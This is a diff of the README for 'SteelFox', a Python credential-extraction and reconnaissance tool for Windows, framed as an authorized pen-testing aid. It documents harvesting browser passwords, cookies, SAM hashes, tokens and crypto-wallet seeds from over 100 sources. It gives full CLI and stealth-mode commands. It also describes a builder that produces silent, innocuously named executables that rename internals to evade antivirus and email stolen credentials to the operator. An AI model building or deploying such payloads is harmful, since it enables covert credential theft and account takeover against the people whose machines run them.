@@ -6,21 +6,24 @@
 <p align="center"><strong>Advanced Windows Credential & Reconnaissance Framework</strong></p>
 
 <p align="center">
-  <img alt="Version" src="https://img.shields.io/badge/version-1.0.0-orange?style=for-the-badge" />
+  <img alt="Version" src="https://img.shields.io/badge/version-1.3.1-orange?style=for-the-badge" />
   <img alt="Platform" src="https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?style=for-the-badge&logo=windows" />
   <img alt="Python" src="https://img.shields.io/badge/python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white" />
   <img alt="Modules" src="https://img.shields.io/badge/modules-112-6e40c9?style=for-the-badge" />
   <img alt="Categories" src="https://img.shields.io/badge/categories-12-2ea043?style=for-the-badge" />
+  <img alt="License" src="https://img.shields.io/badge/license-LGPL--3.0-blue?style=for-the-badge" />
 </p>
 
 <p align="center">
   <a href="#overview">Overview</a> •
-  <a href="#coverage">Coverage</a> •
+  <a href="#features">Features</a> •
   <a href="#installation">Installation</a> •
-  <a href="#builder">Builder</a> •
   <a href="#usage">Usage</a> •
+  <a href="#coverage">Coverage</a> •
+  <a href="#builder--payload-generator">Builder</a> •
   <a href="#architecture">Architecture</a> •
-  <a href="#outputs">Outputs</a> •
+  <a href="#outputs--reports">Outputs</a> •
+  <a href="#roadmap">Roadmap</a> •
   <a href="#legal-disclaimer">Legal</a>
 </p>
 
@@ -28,59 +31,31 @@
 
 ## Overview
 
-SteelFox is a modern, research-grade **Windows-only** credential recovery and system reconnaissance framework built in **Python 3.10+**.
+**SteelFox** is a modern, research-grade credential recovery and system reconnaissance framework designed for **authorized** security auditing on **Windows** systems. Built in Python 3.10+, it provides deep extraction of credentials, tokens, sessions, and operational intelligence from over 112 sources across 12 categories.
 
-It is designed for:
-- Authorized penetration testing
-- Cybersecurity lab work
-- Academic security research
-- Internal security audits
+### Use Cases
 
-SteelFox focuses on **real credential extraction**, **session/token recovery**, and **operational host intelligence** across browsers, messaging apps, cloud/dev tooling, Windows internals, and system artifacts.
-
-### Why SteelFox
-
-- Modern architecture (`dataclass`, typed modules, auto-discovery)
-- Native support for modern crypto paths (Chromium AES-GCM + DPAPI)
-- Broad data acquisition scope: credentials, tokens, sessions, recon artifacts
-- Professional report generation: JSON / TXT / HTML
-- Scalable module ecosystem with category-based execution
+| Context                    | Description                                       |
+| -------------------------- | ------------------------------------------------- |
+| 🔐 **Penetration Testing** | Credential recovery during authorized engagements |
+| 🎓 **Academic Research**   | Cybersecurity lab work and academic study         |
+| 🏢 **Internal Audits**     | Assess credential hygiene in your organization    |
+| 🧪 **Security Labs**       | Controlled testing environments                   |
 
 ---
 
-## Coverage
+## Features
 
-### Current Inventory
-
-- **112 modules**
-- **12 categories**
-- Windows-focused operational coverage
-
-### Categories & Modules
-
-| Category | Count | Modules |
-|---|---:|---|
-| Browsers | 2 | Chromium Browsers, Firefox & Mozilla Browsers |
-| Cloud | 4 | OneDrive, Google Drive, Dropbox, MEGA |
-| Databases | 5 | MySQL Workbench, DBeaver, HeidiSQL, pgAdmin 4, Robo 3T |
-| DevTools | 21 | Git, SSH Keys, Docker, AWS CLI, Azure CLI, NPM, VS Code, JetBrains IDEs, Postman, Insomnia, GCP / gcloud, Kubernetes, GitHub CLI, Terraform, Maven, Composer, PyPI, NuGet, ngrok, Helm, HashiCorp Vault |
-| Gaming | 15 | Steam, Epic Games, Battle.net, OBS Studio, StreamLabs, Spotify, Exodus Wallet, Electrum Wallet, Atomic Wallet, Coinomi Wallet, Bitcoin Core Wallets, Ethereum Keystore, MetaMask, Brave Wallet, Wasabi Wallet |
-| Mails | 3 | Outlook, Thunderbird, Mailbird |
-| Messaging | 8 | Discord, Slack, Microsoft Teams, Signal, Skype, WhatsApp, Telegram, Telegram Desktop Sessions |
-| Network | 9 | WiFi Networks, OpenVPN, NordVPN, ProtonVPN, WireGuard, Cisco AnyConnect, FortiClient VPN, GlobalProtect VPN, Tailscale |
-| Passwords | 4 | KeePass, Bitwarden, 1Password, LastPass |
-| Reconnaissance | 17 | System Information, Network Reconnaissance, Installed Software, Running Processes, Security Software, Startup Programs, USB History, Clipboard, RDP History, User Privileges, Recent Files, Scheduled Tasks, Active Connections, Shared Folders, Defender Exclusions, WiFi Profiles List, Hosts File |
-| Sysadmin | 14 | FileZilla, WinSCP, PuTTY, mRemoteNG, Rclone, VNC, Cyberduck, RDP Connection Manager, CoreFTP, IIS Application Pool, IIS Central Certificate Store, AnyDesk, TeamViewer, WSL |
-| Windows | 10 | Credential Manager, Windows Autologon, Windows Vault, DPAPI Credential Files, SAM Hashdump, Unattended Config, Environment Secrets, PowerShell History, Saved RDP Files, Tortoise SVN |
-
-### Data Types Recovered
-
-- Account credentials (username/password)
-- API/OAuth/PAT tokens and session material
-- Browser secrets (passwords, cookies, autofill, cards, history)
-- Windows secrets (Credential Manager, Vault, DPAPI artifacts)
-- Dev/cloud authentication traces
-- System and network reconnaissance artifacts
+- **112 modules** across **12 categories** — browsers, messaging, mail, passwords, cloud, gaming, devtools, network, sysadmin, databases, Windows internals, and reconnaissance
+- **Modern crypto support** — Chromium AES-GCM + DPAPI, Firefox NSS, modern vault formats
+- **Three report formats** — JSON (machine-readable), TXT (operator-friendly), HTML (polished dark-theme dashboard)
+- **Stealth mode** — silent background execution with no console window
+- **Progress bar UI** — real-time percentage display during scan
+- **Auto-discovery module system** — drop a new module file and it's automatically loaded
+- **Multi-user scanning** — scans all user profiles when running as Administrator
+- **Builder tool** — generate self-contained `.exe` payloads with built-in email reporting
+- **CLI + GUI** — full command-line interface and graphical builder
+- **`pip install`** support — install as a proper Python package
 
 ---
 
@@ -88,63 +63,116 @@ SteelFox focuses on **real credential extraction**, **session/token recovery**, 
 
 ### Prerequisites
 
-- Python **3.10+**
-- Windows **10/11**
-- Administrator privileges recommended for full coverage
+| Requirement       | Details                                                                           |
+| ----------------- | --------------------------------------------------------------------------------- |
+| **Python**        | 3.10 or later                                                                     |
+| **OS (runtime)**  | Windows 10 / 11                                                                   |
+| **OS (building)** | Windows (or Linux for builder via CI — see [Builder section](#building-on-linux)) |
+| **Privileges**    | Administrator recommended for full coverage                                       |
 
-### Install
+### Option 1: pip install (recommended)
 
-```powershell
-cd SteelFox
+```bash
+# Clone the repo
+git clone https://github.com/Tiger-Foxx/fox-steel.git
+cd fox-steel
+
+# Install core (for running SteelFox on Windows)
+pip install .
+
+# Or install in editable/dev mode
+pip install -e .
+
+# Install with builder dependencies (Pillow + PyInstaller)
+pip install ".[builder]"
+
+# Install everything
+pip install ".[all]"
+```
+
+After installation, `steelfox` is available as a command:
+
+```bash
+steelfox --help
+steelfox all
+steelfox browsers -oH
+```
+
+### Option 2: Manual install (requirements.txt)
+
+```bash
+git clone https://github.com/Tiger-Foxx/fox-steel.git
+cd fox-steel
 pip install -r requirements.txt
+python steelfox.py --help
 ```
 
-### Optional Build (Standalone CLI)
+### Option 3: Standalone executable (no Python needed)
+
+Download the latest `steelfox_console.exe` from the [Releases](https://github.com/Tiger-Foxx/fox-steel/releases) page. No installation required — just run it:
 
 ```powershell
-pip install pyinstaller
-python build_console.py
+.\steelfox_console.exe all -oH
 ```
 
-This produces `steelfox.exe` — a console-only standalone with no Python dependency.
-
-**Note on Antivirus Detection:** SteelFox executables may trigger false positives in antivirus software due to their credential extraction capabilities. This is expected behavior for security tools. If flagged, add the executable to your AV exclusions or run in a controlled testing environment.
+> **Note on Antivirus:** SteelFox executables may trigger false positives due to their credential extraction capabilities. This is expected for security tools. Add the executable to your AV exclusions or run in a controlled environment.
 
 ---
 
-## Builder
+## Usage
 
-The **SteelFox Builder** is a standalone graphical tool that lets you package and deploy a fully customized, zero-dependency credential recovery executable — pre-configured with your email reporting settings.
+### On Windows (primary platform)
 
-<p align="center">
-  <img src="steelfox/assets/screen-shoot.png" alt="SteelFox Builder UI" width="80%" />
-</p>
-
-### What the Builder Does
-
-1. Takes your **SMTP credentials** (sender Gmail + app password) and **recipient email** as input  
-2. Packages the entire SteelFox engine + your credentials into a single `.exe`  
-3. The generated executable, when run on a target machine:
-   - Runs silently in the background (no console, no window)  
-   - Collects all credentials and system data  
-   - Generates an HTML report  
-   - Sends the report to your email automatically  
-
-### Running the Builder as a Python Script
+SteelFox is designed to run natively on Windows. You can use either the Python script or installed command:
 
 ```powershell
-pip install -r requirements.txt
-python builder.py
+# List all available modules
+steelfox --list-modules
+# or: python steelfox.py --list-modules
+
+# Run ALL modules (full scan)
+steelfox all
+
+# Run a specific category
+steelfox browsers
+steelfox reconnaissance
+steelfox windows
+
+# Generate an HTML report
+steelfox all -oH
+
+# Generate all report formats into a folder
+steelfox all -oA -output .\reports
+
+# JSON report for a specific category
+steelfox messaging -oJ
+
+# Quiet mode (suppress banner and per-module output)
+steelfox all -q -oH
+
+# Verbose / debug output
+steelfox all -v
+steelfox all -vv
+
+# Stealth mode (hide console, silent, HTML report only)
+steelfox all --stealth -oH -output .\loot
+
+# Supply a master password (e.g. for Firefox master pw, KeePass)
+steelfox all --password "MyMasterPw"
 ```
 
-### Running the Builder CLI (headless / Linux / CI)
+### On Linux (builder mode only — for now)
 
-A full command-line equivalent is available — no GUI, no Tkinter, no display required.
-**This is the recommended method for Linux users or CI pipelines.**
+SteelFox credential recovery is **Windows-only** at this time. However, Linux users can:
+
+1. **Build Windows payloads** using the CLI builder + GitHub Actions CI (no Windows required)
+2. **Install the package** in preparation for future Linux module support
 
 ```bash
-pip install -r requirements.txt
+# Install on Linux
+pip install ".[builder]"
 
+# Use the CLI builder (headless, no GUI required)
 python builder_cli.py \
   --receiver you@gmail.com \
   --sender   you@gmail.com \
@@ -153,138 +181,184 @@ python builder_cli.py \
   --output   ./dist
 ```
 
-All parameters can also be set via environment variables:
+> ⚠️ **Important:** PyInstaller does **not** support cross-compilation. The `.exe` can only be produced on a Windows machine (or a Windows CI runner). See [Building on Linux](#building-on-linux) for the GitHub Actions workflow.
 
-| Variable | Description |
-|---|---|
-| `SF_RECEIVER` | Recipient email |
-| `SF_SENDER` | Sender Gmail (defaults to `SF_RECEIVER`) |
-| `SF_PASSWORD` | Gmail App Password |
-| `SF_NAME` | Output exe name (default: `output`) |
-| `SF_OUTPUT` | Output directory (default: current dir) |
+### CLI Reference
 
-> **Important:** PyInstaller does not support cross-compilation.
-> The `.exe` can only be produced on a **Windows machine**.
-> If you're on Linux, use the GitHub Actions pipeline (see below).
+| Flag                                 | Description                                          |
+| ------------------------------------ | ---------------------------------------------------- |
+| `all` / `browsers` / `windows` / ... | Module category to run (default: `all`)              |
+| `-oJ` / `--json`                     | JSON output                                          |
+| `-oN` / `--txt`                      | TXT output                                           |
+| `-oH` / `--html`                     | HTML output (dark-themed dashboard)                  |
+| `-oA` / `--all-formats`              | All output formats (JSON + TXT + HTML)               |
+| `-output <dir>`                      | Output directory (default: current dir)              |
+| `-p <password>`                      | Master password (Firefox master pw, vault passwords) |
+| `-q` / `--quiet`                     | Suppress banner and per-module console output        |
+| `-s` / `--stealth`                   | Stealth mode: hide console, silent, HTML only        |
+| `-v` / `-vv`                         | Verbose / debug logging                              |
+| `--list-modules`                     | List all available modules and exit                  |
+| `--version`                          | Show version and exit                                |
 
-### Building via GitHub Actions (Linux → Windows exe)
+---
 
-The CI/CD pipeline runs on a `windows-latest` runner.
-From **any OS**, push a version tag to trigger a release build:
+## Coverage
 
-```bash
-git tag -a v1.3.0 -m "my release"
-git push origin v1.3.0
+### Categories & Modules (112 modules, 12 categories)
+
+| Category           | Count | Modules                                                                                                                                                                                                                                                                                     |
+| ------------------ | ----: | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Browsers**       |     2 | Chromium Browsers, Firefox & Mozilla Browsers                                                                                                                                                                                                                                               |
+| **Cloud**          |     4 | OneDrive, Google Drive, Dropbox, MEGA                                                                                                                                                                                                                                                       |
+| **Databases**      |     5 | MySQL Workbench, DBeaver, HeidiSQL, pgAdmin 4, Robo 3T                                                                                                                                                                                                                                      |
+| **DevTools**       |    21 | Git, SSH Keys, Docker, AWS CLI, Azure CLI, NPM, VS Code, JetBrains IDEs, Postman, Insomnia, GCP / gcloud, Kubernetes, GitHub CLI, Terraform, Maven, Composer, PyPI, NuGet, ngrok, Helm, HashiCorp Vault                                                                                     |
+| **Gaming**         |    15 | Steam, Epic Games, Battle.net, OBS Studio, StreamLabs, Spotify, Exodus Wallet, Electrum Wallet, Atomic Wallet, Coinomi Wallet, Bitcoin Core, Ethereum Keystore, MetaMask, Brave Wallet, Wasabi Wallet                                                                                       |
+| **Mails**          |     3 | Outlook, Thunderbird, Mailbird                                                                                                                                                                                                                                                              |
+| **Messaging**      |     8 | Discord, Slack, Microsoft Teams, Signal, Skype, WhatsApp, Telegram, Telegram Desktop Sessions                                                                                                                                                                                               |
+| **Network**        |     9 | WiFi Networks, OpenVPN, NordVPN, ProtonVPN, WireGuard, Cisco AnyConnect, FortiClient VPN, GlobalProtect VPN, Tailscale                                                                                                                                                                      |
+| **Passwords**      |     4 | KeePass, Bitwarden, 1Password, LastPass                                                                                                                                                                                                                                                     |
+| **Reconnaissance** |    17 | System Information, Network Recon, Installed Software, Running Processes, Security Software, Startup Programs, USB History, Clipboard, RDP History, User Privileges, Recent Files, Scheduled Tasks, Active Connections, Shared Folders, Defender Exclusions, WiFi Profiles List, Hosts File |
+| **Sysadmin**       |    14 | FileZilla, WinSCP, PuTTY, mRemoteNG, Rclone, VNC, Cyberduck, RDP Connection Manager, CoreFTP, IIS App Pool, IIS Central Cert Store, AnyDesk, TeamViewer, WSL                                                                                                                                |
+| **Windows**        |    10 | Credential Manager, Windows Autologon, Windows Vault, DPAPI Credential Files, SAM Hashdump, Unattended Config, Environment Secrets, PowerShell History, Saved RDP Files, Tortoise SVN                                                                                                       |
+
+### Data Types Recovered
+
+- Account credentials (username/password)
+- API / OAuth / PAT tokens and session material
+- Browser secrets (passwords, cookies, autofill, cards, history, bookmarks)
+- Windows secrets (Credential Manager, Vault, DPAPI blobs, SAM hashes)
+- Developer & cloud authentication traces (SSH keys, Docker configs, cloud CLI tokens)
+- Cryptocurrency wallet data (seeds, keystores)
+- System and network reconnaissance artifacts
+
+---
+
+## Builder & Payload Generator
+
+The **SteelFox Builder** packages the entire framework into a self-contained `.exe` that runs silently on a target machine and emails back an HTML report.
+
+<p align="center">
+  <img src="steelfox/assets/screen-shoot.png" alt="SteelFox Builder UI" width="80%" />
+</p>
+
+### How the Builder Works
+
+1. Takes your **SMTP credentials** (sender Gmail + app password) and **recipient email**
+2. Packages the SteelFox engine + your encoded credentials into a single `.exe`
+3. The generated executable, when run on a target:
+   - Runs **silently** in the background (no console, no window)
+   - Collects all credentials and system data
+   - Generates an HTML report
+   - Sends the report to your email automatically
+   - Saves a local cache in `%TEMP%\sys_diag_cache.html`
+
+### Builder Methods
+
+| Method                    | OS                | GUI Required     | Best For                     |
+| ------------------------- | ----------------- | ---------------- | ---------------------------- |
+| `python builder.py`       | Windows           | ✅ Yes (Tkinter) | Interactive use              |
+| `python builder_cli.py`   | Windows / Linux\* | ❌ No            | Automation, CI/CD            |
+| `python build_builder.py` | Windows           | —                | Build `steelfox_builder.exe` |
+| GitHub Actions            | Any               | ❌ No            | Remote builds from any OS    |
+
+_\*Linux can run the CLI builder, but PyInstaller requires a Windows host to produce `.exe` files._
+
+### Builder GUI (Windows)
+
+```powershell
+pip install -r requirements.txt
+python builder.py
 ```
 
-To also build a **payload exe** directly from the pipeline, store your credentials as GitHub Secrets:
+| Field                | Description                                          |
+| -------------------- | ---------------------------------------------------- |
+| **Output name**      | Name of the generated `.exe` (e.g. `SysHealthCheck`) |
+| **Icon**             | Optional `.ico` or image file for the executable     |
+| **Recipient email**  | Email address that will receive the report           |
+| **Sender email**     | Gmail address used to send the report                |
+| **App password**     | Gmail App Password (16-char code, see below)         |
+| **Output directory** | Where to save the generated `.exe`                   |
 
-| Secret | Value |
-|---|---|
-| `SF_RECEIVER` | Recipient email |
-| `SF_SENDER` | Sender Gmail |
-| `SF_PASSWORD` | Gmail App Password |
-| `SF_NAME` | Output exe name (optional) |
+### Builder CLI (headless)
 
-Or trigger manually with **Actions → Run workflow** and fill in the inputs directly.
+```bash
+python builder_cli.py \
+  --receiver you@gmail.com \
+  --sender   you@gmail.com \
+  --password "abcd efgh ijkl mnop" \
+  --name     SysHealthCheck \
+  --output   ./dist
+```
 
-### Running the Builder as a Standalone Executable
+Environment variables are also supported:
 
-A pre-built `steelfox_builder.exe` is provided. Just double-click it — no Python installation required.
+| Variable      | Description                              |
+| ------------- | ---------------------------------------- |
+| `SF_RECEIVER` | Recipient email                          |
+| `SF_SENDER`   | Sender Gmail (defaults to `SF_RECEIVER`) |
+| `SF_PASSWORD` | Gmail App Password                       |
+| `SF_NAME`     | Output exe name (default: `output`)      |
+| `SF_OUTPUT`   | Output directory (default: current dir)  |
 
-To rebuild it yourself:
+### Building on Linux
+
+PyInstaller does **not** support cross-compilation. To produce Windows `.exe` files from Linux, use the **GitHub Actions CI/CD pipeline**:
+
+```bash
+# Tag and push to trigger a release build on a Windows runner
+git tag -a v1.3.1 -m "Release v1.3.1"
+git push origin v1.3.1
+```
+
+To also build a **payload exe** from the pipeline, set these GitHub Secrets:
+
+| Secret        | Value                      |
+| ------------- | -------------------------- |
+| `SF_RECEIVER` | Recipient email            |
+| `SF_SENDER`   | Sender Gmail               |
+| `SF_PASSWORD` | Gmail App Password         |
+| `SF_NAME`     | Output exe name (optional) |
+
+Or trigger manually via **Actions → Run workflow** and fill in the inputs.
+
+### Gmail App Password Setup
+
+The builder requires a **Gmail App Password** (not your regular account password):
+
+1. Go to [Google Account Security](https://myaccount.google.com/security)
+2. Enable **2-Step Verification**
+3. Go to **App passwords** and create a new one (name it anything)
+4. Use the generated 16-character code as the password in the builder
+
+### Standalone Builder Executable
+
+A pre-built `steelfox_builder.exe` is available on the [Releases](https://github.com/Tiger-Foxx/fox-steel/releases) page — no Python required. To rebuild it yourself:
 
 ```powershell
 python build_builder.py
 ```
 
-This produces `steelfox_builder.exe` at the root of the project.
-
-### Builder UI Walkthrough
-
-| Field | Description |
-|---|---|
-| **Output name** | Name of the generated `.exe` (e.g. `SysHealthCheck`) |
-| **Output directory** | Folder where the generated `.exe` will be saved |
-| **Icon** | Optional `.ico` file for the generated executable |
-| **Sender email** | Gmail address used to send the report |
-| **App password** | Gmail App Password (16-char, not your regular password) |
-| **Receiver email** | Email address that will receive the report |
-
-Once all fields are filled, click **Build Executable**. The build process:
-
-1. Copies the SteelFox source into a temp directory
-2. Renames the package to a neutral name to reduce AV heuristic triggers
-3. Patches the entry script with your encoded credentials
-4. Calls PyInstaller to produce a `--onefile --windowed` executable
-5. Moves the final `.exe` to your chosen output directory
-
-### Gmail App Password Setup
-
-The builder requires a **Gmail App Password**, not your account password:
-
-1. Go to [Google Account Security](https://myaccount.google.com/security)
-2. Enable **2-Step Verification**
-3. Under "App passwords", create a new one (name it anything)
-4. Use the generated 16-character code as the app password in the builder
-
-### Architecture of the Generated Executable
-
-```text
-YourExe.exe  (PyInstaller --onefile --windowed)
-└── _MEI*/
-    └── sysdiag/         ← SteelFox engine, renamed for discretion
-        ├── core/
-        └── modules/
-```
-
-- Runs without any console window  
-- No Python installation required on the target machine  
-- Report is sent by email; a local cache is saved in `%TEMP%\sys_diag_cache.html`  
-- Self-contained: all dependencies embedded
-
 ---
 
-## Usage
+## Outputs & Reports
 
-```powershell
-python steelfox.py --list-modules
-python steelfox.py all
-python steelfox.py browsers -oJ
-python steelfox.py all -oA -output .\reports
-python steelfox.py reconnaissance -q -oJ
-```
+SteelFox generates reports in three formats:
 
-### CLI Flags
+| Format   | Flag  | Description                                                                                |
+| -------- | ----- | ------------------------------------------------------------------------------------------ |
+| **HTML** | `-oH` | Dark-themed dashboard with search, filtering, click-to-reveal passwords, copy-to-clipboard |
+| **JSON** | `-oJ` | Structured machine-readable output for automation                                          |
+| **TXT**  | `-oN` | Plaintext operator-friendly report for quick review                                        |
+| **All**  | `-oA` | Generates HTML + JSON + TXT simultaneously                                                 |
 
-| Flag | Description |
-|---|---|
-| `-oJ` | JSON output |
-| `-oN` | TXT output |
-| `-oH` | HTML output |
-| `-oA` | All output formats |
-| `-output <dir>` | Output directory |
-| `-p <password>` | Master password input (when needed) |
-| `-q` | Quiet mode |
-| `-v` / `-vv` | Verbose logging |
-| `--list-modules` | List all modules |
+### Report Features
 
----
-
-## Outputs
-
-SteelFox can generate:
-
-- **JSON**: structured machine-readable report
-- **TXT**: operator-friendly plaintext report
-- **HTML**: polished dark-themed report for delivery/review
-
-### Reporting Design
-
-- Multi-user aware aggregation
-- Category + module grouping
-- Timestamped result files
-- UTF-8 output handling
+- Multi-user aggregation (separate sections per user profile)
+- Category and module grouping
+- Timestamped output files (`steelfox_report_YYYYMMDD_HHMMSS.*`)
+- UTF-8 encoding with proper handling of special characters
+- Sensitive data masking with click-to-reveal in HTML reports
+- Interactive search and filtering in HTML reports
 
 ---
 
@@ -292,49 +366,113 @@ SteelFox can generate:
 
 ```text
 SteelFox/
-├── steelfox.py
-├── steelfox.spec
-├── requirements.txt
-├── README.md
-└── steelfox/
-    ├── core/
-    │   ├── config.py
-    │   ├── module_base.py
-    │   ├── module_loader.py
-    │   ├── runner.py
-    │   ├── output.py
-    │   ├── privileges.py
-    │   └── winapi.py
-    ├── modules/
-    │   ├── browsers/
-    │   ├── messaging/
-    │   ├── mails/
-    │   ├── passwords/
-    │   ├── cloud/
-    │   ├── gaming/
-    │   ├── devtools/
-    │   ├── network/
-    │   ├── sysadmin/
-    │   ├── databases/
-    │   ├── windows/
-    │   └── reconnaissance/
-    └── assets/
+├── steelfox.py              # Main CLI entry point
+├── steelfox_cli.py           # pip console_scripts wrapper
+├── setup.py                  # pip install support
+├── requirements.txt          # Dependencies
+├── builder.py                # GUI payload builder (Tkinter)
+├── builder_cli.py            # Headless CLI payload builder
+├── build_console.py          # Build steelfox_console.exe
+├── build_builder.py          # Build steelfox_builder.exe
+│
+├── steelfox/                 # Core package
+│   ├── core/
+│   │   ├── config.py         # Global configuration & runtime state
+│   │   ├── module_base.py    # Abstract base class for all modules
+│   │   ├── module_loader.py  # Auto-discovery of modules
+│   │   ├── runner.py         # Scan execution engine
+│   │   ├── output.py         # Report generation (HTML/JSON/TXT)
+│   │   ├── privileges.py     # Admin detection & user enumeration
+│   │   └── winapi.py         # Win32 API wrappers (DPAPI, registry, etc.)
+│   │
+│   ├── modules/              # All recovery/recon modules
+│   │   ├── browsers/         # Chromium, Firefox
+│   │   ├── messaging/        # Discord, Slack, Teams, Signal, etc.
+│   │   ├── mails/            # Outlook, Thunderbird, Mailbird
+│   │   ├── passwords/        # KeePass, Bitwarden, 1Password, LastPass
+│   │   ├── cloud/            # OneDrive, GDrive, Dropbox, MEGA
+│   │   ├── gaming/           # Steam, Epic, crypto wallets
+│   │   ├── devtools/         # Git, SSH, Docker, AWS, VS Code, etc.
+│   │   ├── network/          # WiFi, VPN clients
+│   │   ├── sysadmin/         # FileZilla, PuTTY, WinSCP, etc.
+│   │   ├── databases/        # MySQL, DBeaver, HeidiSQL, etc.
+│   │   ├── windows/          # Credential Manager, SAM, DPAPI, etc.
+│   │   └── reconnaissance/   # System info, processes, network recon
+│   │
+│   └── assets/               # Logos, icons, images
+│
+├── .github/workflows/        # CI/CD pipeline
+│   └── steelfox_release.yml  # Build & release on tag push
+│
+├── version_builder.txt       # VERSIONINFO for builder exe
+├── version_console.txt       # VERSIONINFO for console exe
+├── version_payload.txt       # VERSIONINFO for generated payloads
+├── CHANGELOG.md
+├── CODE_OF_CONDUCT.md
+└── LICENSE                   # LGPL-3.0
 ```
 
 ### Design Principles
 
-- Modular, typed, category-driven architecture
-- Automatic module discovery (no hardcoded module registry)
-- Deferred execution model for context-sensitive modules
-- Separation between collection engine and report layer
+- **Modular & typed** — every module inherits from `ModuleBase` with typed metadata
+- **Auto-discovery** — drop a `.py` file into `modules/<category>/` and it's loaded automatically
+- **Deferred execution** — context-sensitive modules (DPAPI, WinAPI) run at optimal timing
+- **Separation of concerns** — collection engine, reporting layer, and UI are fully independent
+- **Category-driven** — scan all modules, or target specific categories
+
+### Execution Flow
+
+```text
+steelfox.py → runner.py → module_loader.py → [modules] → output.py → reports
+                 │
+                 ├── System modules (admin-only, run first)
+                 ├── Current user modules
+                 ├── Other users modules (if admin)
+                 └── Deferred modules (DPAPI/WinAPI, run last)
+```
 
 ---
 
-## Professional Notes
+## Roadmap
 
-- This project is intentionally Windows-specialized for depth and reliability.
-- Results vary by privilege level and endpoint hardening policy.
-- Some collected artifacts are encrypted by design and may require additional context for offline exploitation.
+| Status     | Feature                                                                                                           |
+| ---------- | ----------------------------------------------------------------------------------------------------------------- |
+| ✅ Done    | Windows credential recovery (112 modules)                                                                         |
+| ✅ Done    | HTML / JSON / TXT reporting                                                                                       |
+| ✅ Done    | GUI & CLI builder with email reporting                                                                            |
+| ✅ Done    | GitHub Actions CI/CD pipeline                                                                                     |
+| ✅ Done    | `pip install .` support (`setup.py`)                                                                              |
+| 🔜 Planned | **Linux credential recovery modules** (Firefox, Chrome, WiFi, SSH, GNOME Keyring, KWallet, GPG, cloud CLI tokens) |
+| 🔜 Planned | Native Linux binary generation (no Wine/PyInstaller cross-compile needed)                                         |
+| 🔜 Planned | macOS credential recovery modules                                                                                 |
+| 💡 Ideas   | Plugin system for community-contributed modules                                                                   |
+| 💡 Ideas   | Web-based report viewer                                                                                           |
+
+---
+
+## Contributing
+
+Contributions are welcome! To add a new module:
+
+1. Create a new `.py` file in the appropriate `steelfox/modules/<category>/` directory
+2. Define a class inheriting from `ModuleBase` with a `meta` attribute and `run()` method
+3. The module will be auto-discovered — no registration needed
+
+```python
+from steelfox.core.module_base import Category, ModuleBase, ModuleMeta
+
+class MyNewModule(ModuleBase):
+    meta = ModuleMeta(
+        name="My Module",
+        category=Category.BROWSERS,
+        description="Recovers credentials from MyApp",
+    )
+
+    def run(self) -> list[dict]:
+        results = []
+        # ... your recovery logic ...
+        return results
+```
 
 ---
 
@@ -342,12 +480,12 @@ SteelFox/
 
 SteelFox must be used **only** in authorized contexts:
 
-- Internal security assessment with written approval
-- Academic/lab environments you control
-- Contracted penetration testing engagements
+- ✅ Internal security assessments with **written approval**
+- ✅ Academic / lab environments **you control**
+- ✅ Contracted penetration testing engagements
+- ❌ Unauthorized access, credential collection, or lateral use is **illegal and unethical**
 
-Unauthorized access, credential collection, or lateral use is illegal and unethical.
-You are solely responsible for lawful operation.
+You are solely responsible for lawful operation. The author assumes no liability for misuse.
 
 ---
 
@@ -357,9 +495,9 @@ You are solely responsible for lawful operation.
   <img src="https://avatars.githubusercontent.com/u/118616410?v=4" alt="Fox GitHub Avatar" width="74" style="border-radius:50%;" />
 </p>
 
-- **Fox**
-- Version: **1.0.0**
-- Inspiration: (AlessandroZ)
+- **Fox** — [@Tiger-Foxx](https://github.com/Tiger-Foxx)
+- Version: **1.3.1**
+- Inspired by: [LaZagne](https://github.com/AlessandroZ/LaZagne) (AlessandroZ)
 
 ---
 
@@ -371,20 +509,18 @@ You are solely responsible for lawful operation.
   <img alt="SQLite" src="https://img.shields.io/badge/SQLite-003B57?style=flat-square&logo=sqlite&logoColor=white" />
   <img alt="Windows API" src="https://img.shields.io/badge/Win32%20API-0078D6?style=flat-square&logo=windows&logoColor=white" />
   <img alt="PowerShell" src="https://img.shields.io/badge/PowerShell-5391FE?style=flat-square&logo=powershell&logoColor=white" />
-  <img alt="Git" src="https://img.shields.io/badge/Git-F05032?style=flat-square&logo=git&logoColor=white" />
-  <img alt="GitHub" src="https://img.shields.io/badge/GitHub-181717?style=flat-square&logo=github&logoColor=white" />
+  <img alt="PyInstaller" src="https://img.shields.io/badge/PyInstaller-FFDA44?style=flat-square&logo=python&logoColor=black" />
+  <img alt="GitHub Actions" src="https://img.shields.io/badge/GitHub%20Actions-2088FF?style=flat-square&logo=githubactions&logoColor=white" />
 </p>
 
 ---
-
-## Footer
 
 <p align="center">
   <img src="steelfox/assets/logo-steel-fox-icon.png" alt="SteelFox Logo" width="58" />
 </p>
 
 <p align="center">
-  <strong>SteelFox</strong> — professional credential auditing for authorized Windows security operations.
+  <strong>SteelFox</strong> — professional credential auditing for authorized security operations.
 </p>
 
 <p align="center">
